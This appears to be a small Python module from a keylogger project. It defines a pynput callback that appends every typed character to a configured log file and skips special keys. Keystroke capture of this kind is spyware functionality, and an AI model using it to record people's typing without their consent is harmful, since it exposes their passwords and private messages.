# logger.py

import os
from pynput import keyboard
from config import KEYLOG_FILE

def key_pressed(key):
    """Log the pressed key to the specified key log file."""
    try:
        char = key.char
        if char:  # Ensure it's a character key
            with open(KEYLOG_FILE, 'a') as log_key:
                log_key.write(char)
    except AttributeError:
        print("Special key pressed; not logged.")
    except IOError as e:
        print(f"File error: {e}")